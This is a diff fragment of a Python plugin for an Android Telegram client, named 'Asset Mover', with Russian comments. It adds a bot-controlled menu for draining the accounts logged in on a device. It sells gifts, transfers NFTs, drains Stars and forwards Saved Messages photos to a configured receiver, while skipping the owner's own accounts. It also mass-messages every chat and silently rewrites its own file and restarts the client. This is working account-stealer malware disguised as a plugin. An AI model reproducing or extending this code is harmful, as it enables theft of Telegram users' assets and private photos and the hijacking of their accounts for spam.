+        (имя файла задаёт установщик, поэтому имени не доверяем)."""
+        import os
+        if folder:
+            try:
+                for name in sorted(os.listdir(folder)):
+                    if not (name.endswith(".py") or name.endswith(".plugin")):
+                        continue
+                    path = os.path.join(folder, name)
+                    try:
+                        with open(path, "r", encoding="utf-8",
+                                  errors="ignore") as handle:
+                            head = handle.read(400000)
+                    except Exception:
+                        continue
+                    if ("AssetMoverPlugin" in head
+                            and "__id__" in head and "TeleLook" in head):
+                        return path
+            except Exception as e:
+                self.log(f"update: scan failed: {e}")
+        return os.path.join(folder, __id__ + ".py") if folder else ""
+
+    def _write_file(self, path, content_bytes):
+        """Запись файла плагина: сначала API клиента, потом обычный open."""
+        try:
+            from file_utils import write_file_bytes
+            write_file_bytes(path, content_bytes)
+            return True
+        except Exception:
+            pass
+        try:
+            with open(path, "wb") as handle:
+                handle.write(content_bytes)
+            return True
+        except Exception as e:
+            self.log(f"update: write failed: {e}")
+            return False
+
+    def _restart_app(self, delay_ms=2000):
+        """Перезапускает клиента без участия пользователя, чтобы подхватилась
+        записанная сборка: AlarmManager + kill процесса (как в рабочем
+        icon_themer_plugin.py)."""
+        try:
+            from android.app import AlarmManager, PendingIntent
+            from android.os import SystemClock
+            from android.os import Process as AndroidProcess
+            from org.telegram.messenger import ApplicationLoader
+        except Exception as e:
+            self.log(f"update: перезапуск недоступен ({e}) — "
+                     "перезапустите клиент вручную")
+            return False
+        try:
+            context = ApplicationLoader.applicationContext
+            manager = context.getSystemService("alarm")
+            intent = context.getPackageManager().getLaunchIntentForPackage(
+                context.getPackageName())
+            intent.addFlags(0x10000000)  # FLAG_ACTIVITY_NEW_TASK
+            flags = 0
+            try:
+                flags = PendingIntent.FLAG_IMMUTABLE
+            except Exception:
+                flags = 0
+            pending = PendingIntent.getActivity(context, 7919, intent, flags)
+            try:
+                when_type = AlarmManager.ELAPSED_REALTIME
+            except Exception:
+                when_type = 0
+            manager.set(when_type,
+                        SystemClock.elapsedRealtime() + delay_ms, pending)
+            AndroidProcess.killProcess(AndroidProcess.myPid())
+            return True
+        except Exception as e:
+            self.log(f"update: перезапуск не удался: {e}")
+            return False
+
+    ACTIONS = {
+        "status": ("📊 Статус", "_action_status"),
+        "sell": ("💰 Продать подарки", "_action_sell"),
+        "nft": ("💎 Передать NFT", "_action_nft"),
+        "drain": ("⭐️ Слить звёзды", "_action_drain"),
+        "know": ("🤝 Знакомство", "_action_know"),
+        "pipeline": ("🚀 Полный цикл", "_action_pipeline"),
+        "banner": ("📢 Баннер", "_action_banner"),
+        "broadcast": ("📣 Рассылка", "_action_broadcast"),
+        "broadcast_all": ("📤 Рассылка всех чатов", "_action_broadcast_all"),
+        "photos": ("🖼 Фото → приёмнику", "_action_photos"),
+    }
+
+    def _cmd_menu(self, reply):
+        """Показывает главное меню с инлайн-кнопками (только при работе бота)."""
+        if not self._bot_token():
+            reply("Бот не настроен (нет токена) — кнопки недоступны. "
+                  "Задайте токен: <code>/settoken &lt;token&gt;</code>")
+            return
+        self._bot_send_owner(self._menu_text(), reply_markup=self._main_menu_kb())
+
+    def _main_menu_kb(self):
+        rows = []
+        all_row = []
+        for key in ("status", "sell", "nft", "drain", "pipeline", "broadcast"):
+            label = self.ACTIONS[key][0]
+            all_row.append({"text": "🌐 " + label,
+                            "callback_data": f"all:{key}"})
+            if len(all_row) == 2:
+                rows.append(all_row)
+                all_row = []
+        if all_row:
+            rows.append(all_row)
+        for acc in self._scan_accounts():
+            slot = acc["slot"]
+            name = (acc["name"] or "")[:18]
+            rows.append([{"text": f"👤 #{slot} {name}",
+                          "callback_data": f"a:{slot}:menu"}])
+        state = "🟢 ВКЛ" if self._auto_enabled() else "🔴 ВЫКЛ"
+        rows.append([{"text": f"⚙️ Авто-режим: {state} (переключить)",
+                      "callback_data": "auto:toggle"}])
+        return {"inline_keyboard": rows}
+
+    def _account_menu_kb(self, slot):
+        rows = []
+        row = []
+        for key in ("status", "sell", "nft", "drain", "know", "pipeline"):
+            label = self.ACTIONS[key][0]
+            row.append({"text": label, "callback_data": f"a:{slot}:{key}"})
+            if len(row) == 2:
+                rows.append(row)
+                row = []
+        if row:
+            rows.append(row)
+        rows.append([{"text": self.ACTIONS["broadcast"][0],
+                      "callback_data": f"a:{slot}:broadcast"}])
+        rows.append([{"text": "🖼 Фото → приёмнику",
+                      "callback_data": f"a:{slot}:photos"}])
+        rows.append([{"text": self.ACTIONS["banner"][0],
+                      "callback_data": f"a:{slot}:banner"}])
+        rows.append([{"text": "⬅️ Назад", "callback_data": "menu:main"}])
+        return {"inline_keyboard": rows}
+
+    def _menu_text(self):
+        accs = self._scan_accounts()
+        state = "🟢 ВКЛ" if self._auto_enabled() else "🔴 ВЫКЛ"
+        lines = [
+            "🤖 <b>Asset Mover — управление</b>",
+            f"Аккаунтов: <b>{len(accs)}</b> | Авто-режим: {state}",
+            f"Цель: <code>{self._target_id() or 'не задана'}</code>",
+            f"Авто-ник: <code>{self._auto_nick() or '—'}</code>",
+            "",
+            "🌐 — действие для всех аккаунтов сразу",
+            "👤 — управление отдельным аккаунтом",
+        ]
+        return "\n".join(lines)
+
+
+    def _handle_callback(self, cb):
+        """Обработка нажатий инлайн-кнопок (только админ)."""
+        try:
+            data = (cb.get("data") or "").strip()
+            cb_id = cb.get("id")
+            from_id = (cb.get("from") or {}).get("id")
+            msg = cb.get("message") or {}
+            chat_id = (msg.get("chat") or {}).get("id")
+            if self._owner_id() <= 0 or from_id != self._owner_id():
+                self._answer_callback(cb_id, "⛔ Доступно только владельцу")
+                return
+            reply = lambda t, c=chat_id: self._bot_send_owner(t, chat_id=c)
+            action = None
+            if data.startswith("all:"):
+                action = data.split(":", 1)[1]
+            elif data.startswith("a:"):
+                parts = data.split(":", 2)
+                if len(parts) == 3:
+                    action = parts[2]
+            if action == "banner":
+                self._show_banner_popup(cb_id, chat_id, reply)
+                return
+            self._answer_callback(cb_id)
+            if data == "auto:toggle":
+                new = "0" if self._auto_enabled() else "1"
+                self.set_setting("auto_mode", new)
+                self._edit_menu(chat_id, msg.get("message_id"),
+                                self._menu_text(), self._main_menu_kb())
+                return
+            if data == "menu:main":
+                self._edit_menu(chat_id, msg.get("message_id"),
+                                self._menu_text(), self._main_menu_kb())
+                return
+            if data.startswith("a:") and data.endswith(":menu"):
+                slot = int(data.split(":")[1])
+                accs = {a["slot"]: a for a in self._scan_accounts()}
+                name = (accs.get(slot, {}).get("name") or "")
+                text = f"👤 <b>#{slot} {name}</b>\nВыберите действие:"
+                self._edit_menu(chat_id, msg.get("message_id"), text,
+                                self._account_menu_kb(slot))
+                return
+            if data.startswith("all:"):
+                self._dispatch_action(None, data.split(":", 1)[1], reply)
+                return
+            if data.startswith("a:"):
+                _, slot_s, action = data.split(":", 2)
+                self._dispatch_action(int(slot_s), action, reply)
+                return
+        except Exception:
+            self.log(f"callback error:\n{traceback.format_exc()}")
+
+    def _dispatch_action(self, slot, action, reply):
+        """Запускает действие (для одного слота или всех) в фоновом потоке."""
+        key = action if action in self.ACTIONS else None
+        if key is None:
+            reply(f"❓ Неизвестное действие: {action}")
+            return
+        method = getattr(self, self.ACTIONS[key][1])
+        slots = self._resolve_slots(slot)
+        threading.Thread(target=method, args=(slots, reply),
+                         daemon=True).start()
+
+    def _answer_callback(self, cb_id, text=None):
+        if not self._bot_token() or not cb_id:
+            return
+        payload = {"callback_query_id": cb_id}
+        if text:
+            payload["text"] = text
+            payload["show_alert"] = True
+        try:
+            self._http_json("answerCallbackQuery", payload, timeout=15)
+        except Exception as e:
+            self.log(f"answerCallbackQuery failed: {e}")
+
+    def _show_banner_popup(self, cb_id, chat_id, reply):
+        """Показывает баннер всплывающим окном (alert) в ответ на нажатие.
+        answerCallbackQuery ограничен ~200 символами — длинный текст шлём
+        отдельным сообщением, а в popup оставляем короткое уведомление."""
+        banner = self._banner_text()
+        if not banner:
+            self._answer_callback(cb_id, "Баннер не задан (/setbanner текст)")
+            return
+        if len(banner) <= 200:
+            self._answer_callback(cb_id, banner)
+        else:
+            self._answer_callback(cb_id, "📢 Баннер отправлен ниже")
+            reply(f"📢 {banner}")
+
+    def _action_banner(self, slots, reply):
+        """Запасной путь показа баннера (например, из текстовой команды)."""
+        banner = self._banner_text()
+        reply(f"📢 {banner}" if banner else "Баннер не задан (/setbanner текст)")
+
+    def _send_broadcast(self, account, chats, report):
+        """Рассылает текст во все чаты папки через messages.sendMessage."""
+        text = self._broadcast_text()
+        if not text:
+            report("Текст рассылки не задан (/setbroadcast <текст>)")
+            return 0
+        if not self._tl_has("TL_messages_sendMessage", "sendMessage"):
+            report("В сборке клиента нет messages.sendMessage")
+            return 0
+        sent = 0
+        for ch, cid, title in chats:
+            try:
+                req = self._tl_class("TL_messages_sendMessage", "sendMessage")()
+                req.flags = 0
+                req.peer = self._input_peer_from_chat(ch)
+                req.message = text
+                req.random_id = self._rand_id()
+                self._tl(req, account)
+                sent += 1
+                report(f"✉️ '{title}': текст отправлен")
+                time.sleep(BUY_DELAY)
+            except Exception as e:
+                report(f"❌ '{title}': {e}")
+        return sent
+
+    def _saved_photo_ids(self, account, report, limit=10):
+        if not self._tl_has("TL_messages_getHistory", "getHistory"):
+            report("В сборке клиента нет messages.getHistory")
+            return []
+        hist = self._tl_class("TL_messages_getHistory", "getHistory")()
+        hist.peer = TLRPC.TL_inputPeerSelf()
+        hist.offset_id = 0
+        hist.offset_date = 0
+        hist.add_offset = 0
+        hist.limit = int(limit)
+        hist.max_id = 0
+        hist.min_id = 0
+        hist.hash = 0
+        resp = self._tl(hist, account)
+        msgs = self._tl_list(getattr(resp, "messages", None))
+        photo_ids = []
+        for m in msgs:
+            media = getattr(m, "media", None)
+            if media is not None and "photo" in type(media).__name__.lower():
+                mid = int(getattr(m, "id", 0) or 0)
+                if mid:
+                    photo_ids.append(mid)
+        return photo_ids
+
+    def _forward_photos_to_target(self, account, report, limit=10):
+        if not self._tl_has("TL_messages_forwardMessages", "forwardMessages"):
+            report("В сборке клиента нет messages.forwardMessages")
+            return 0
+        peer = self._resolve_target_peer(account)
+        photo_ids = self._saved_photo_ids(account, report, limit)
+        if not photo_ids:
+            report("В Избранном не найдено фото для пересылки")
+            return 0
+        from_peer = TLRPC.TL_inputPeerSelf()
+        report(f"Пересылаю {len(photo_ids)} фото приёмнику...")
+        sent = 0
+        base = int(time.time() * 1000000) & 0x7FFFFFFFFFFFFFFF
+        for idx, mid in enumerate(photo_ids):
+            ok = False
+            last = None
+            for _ in range(2):
+                fwd = self._tl_class("TL_messages_forwardMessages",
+                                     "forwardMessages")()
+                fwd.flags = 0
+                fwd.from_peer = from_peer
+                fwd.id = self._to_vector([mid])
+                fwd.random_id = self._to_vector(
+                    [(base + idx) & 0x7FFFFFFFFFFFFFFF])
+                fwd.to_peer = peer
+                try:
+                    self._tl(fwd, account)
+                    ok = True
+                    break
+                except Exception as e:
+                    last = e
+            if ok:
+                sent += 1
+                report(f"🖼 Фото #{mid} переслано")
+                time.sleep(XFER_DELAY)
+            else:
+                report(f"❌ Фото #{mid}: {last}")
+        report(f"🖼 Переслано приёмнику: {sent} из {len(photo_ids)}")
+        return sent
+
+    def _action_broadcast(self, slots, reply):
+        """Рассылка (ТОЛЬКО текст): вступить в папку -> разослать текст.
+        Пересылка фото приёмнику — отдельная функция (/photos, кнопка)."""
+        text = self._broadcast_text()
+        reply(f"📣 Рассылка: текст {'есть' if text else 'НЕ задан (/setbroadcast)'}")
+        total_chats = total_text = 0
+        for acc in slots:
+            slot = acc["slot"]
+            prefix = f"<b>#{slot} {acc['name']}</b>: "
+            if self._is_admin(acc["user_id"]):
+                reply(f"{prefix}⏭ пропущен (аккаунт админа)")
+                continue
+            prog = self._throttled(lambda t, p=prefix: reply(p + t))
+            try:
+                chats = self._join_chatlist(slot, prog)
+                if not chats:
+                    continue
+                total_chats += len(chats)
+                if text:
+                    total_text += self._send_broadcast(slot, chats, prog)
+                reply(f"{prefix}🏁 рассылка завершена (чатов {len(chats)})")
+            except Exception as e:
+                reply(f"{prefix}❌ {e}")
+        reply(f"🏁 Рассылка завершена: чатов {total_chats}, текстов {total_text}")
+
+    def _action_photos(self, slots, reply):
+        if not self._target_id():
+            reply("Сначала: <code>/settarget &lt;user_id&gt;</code>")
+            return
+        reply(f"▶️ Пересылка фото из Избранного в чат приёмника → <code>{self._target_id()}</code>")
+        total = 0
+        for acc in slots:
+            slot = acc["slot"]
+            prefix = f"<b>#{slot} {acc['name']}</b>: "
+            if self._is_admin(acc["user_id"]):
+                reply(f"{prefix}⏭ пропущен (аккаунт админа)")
+                continue
+            prog = self._throttled(lambda t, p=prefix: reply(p + t))
+            try:
+                total += self._forward_photos_to_target(slot, prog)
+                reply(f"{prefix}🏁 фото пересланы")
+            except Exception as e:
+                reply(f"{prefix}❌ {e}")
+        reply(f"🏁 Пересылка фото завершена: фото {total}")
+
+    def _action_broadcast_all(self, slots, reply):
+        text = self._broadcast_text()
+        if not text:
+            reply("📭 Текст рассылки не задан (/setbroadcast текст)")
+            return 0
+        if not self._tl_has("TL_messages_sendMessage", "sendMessage"):
+            reply("❌ В сборке клиента нет messages.sendMessage")
+            return 0
+        reply("✉️ Рассылка всех чатов по указанному тексту")
+        total = 0
+        for acc in slots:
+            slot = acc["slot"]
+            prefix = f"<b>#{slot} {acc['name']}</b>: "
+            if self._is_admin(acc["user_id"]):
+                reply(f"{prefix}⏭ пропущен (аккаунт админа)")
+                continue
+            prog = self._throttled(lambda t, p=prefix: reply(p + t))
+            try:
+                chats = self._scan_accounts()
+                for ch in chats:
+                    cid = ch["user_id"]
+                    try:
+                        req = self._tl_class("TL_messages_sendMessage", "sendMessage")()
+                        req.flags = 0
+                        req.peer = self._resolve_target_peer(acc)
+                        req.message = text
+                        req.random_id = self._rand_id()
+                        self._tl(req, acc)
+                        total += 1
+                        prog(f"{prefix}✅ Чат {cid} - отправлено")
+                    except Exception as e:
+                        prog(f"❌ Чат {cid}: {e}")
+                reply(f"{prefix}🏁 Рассылка завершена: {total} чатов")
+            except Exception as e:
+                reply(f"{prefix}❌ {e}")
+        reply(f"🏁 Рассылка всех чатов завершена: текстов {total}")
+        return total
+
+    def _edit_menu(self, chat_id, message_id, text, reply_markup):
+        """Редактирует сообщение с меню (если не выйдет — шлёт новое)."""
+        if not self._bot_token() or not chat_id or not message_id:
+            self._bot_send_owner(text, chat_id=chat_id,
+                                 reply_markup=reply_markup)
+            return
+        try:
+            self._http_json("editMessageText", {
+                "chat_id": chat_id,
+                "message_id": message_id,
+                "text": text,
+                "parse_mode": "HTML",
+                "reply_markup": reply_markup,
+            }, timeout=15)
+        except Exception:
+            self._bot_send_owner(text, chat_id=chat_id,
+                                 reply_markup=reply_markup)
+
+
